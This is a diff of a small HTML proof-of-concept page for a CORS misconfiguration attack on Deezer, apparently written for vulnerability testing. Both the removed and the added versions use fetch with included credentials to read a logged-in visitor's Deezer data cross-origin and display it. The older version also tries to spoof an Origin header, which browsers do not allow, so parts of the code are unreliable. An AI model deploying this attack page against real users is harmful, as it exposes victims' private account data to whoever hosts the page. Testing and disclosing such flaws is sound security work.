@@ -1,29 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Deezer CORS Misconfiguration PoC</title>
+    <title>CORS Exploit PoC</title>
 </head>
 <body>
-  <h1>Deezer CORS Attack Test</h1>
-  <p>If successful, this page will retrieve sensitive data from Deezer.</p>
+    <h1>CORS Misconfiguration PoC</h1>
+    <p>Click the button below to test the CORS vulnerability.</p>
+    <button onclick="testCORS()">Test CORS</button>
 
-  <script>
-    fetch("https://www.deezer.com/user-profile-endpoint", {
-      method: "GET",
-      credentials: "include",
-      headers: {
-        "Origin": "https://evilwww.deezer.com"
-      }
-    })
-    .then(response => response.text())
-    .then(data => {
-      console.log("Sensitive data from Deezer:", data);
-      alert("Data retrieved: " + data);
-    })
-    .catch(err => {
-      console.error("CORS Attack Failed:", err);
-      alert("CORS Attack Failed. No data retrieved.");
-    });
-  </script>
+    <script>
+        function testCORS() {
+            fetch('https://www.deezer.com', {
+                method: 'GET',
+                credentials: 'include' // Include cookies in the request
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log("Response from Deezer:", data);
+                alert("CORS Request Success! Check the console for the response.");
+            })
+            .catch(error => {
+                console.error("CORS request failed:", error);
+                alert("CORS Request Failed. See the console for details.");
+            });
+        }
+    </script>
 </body>
 </html>
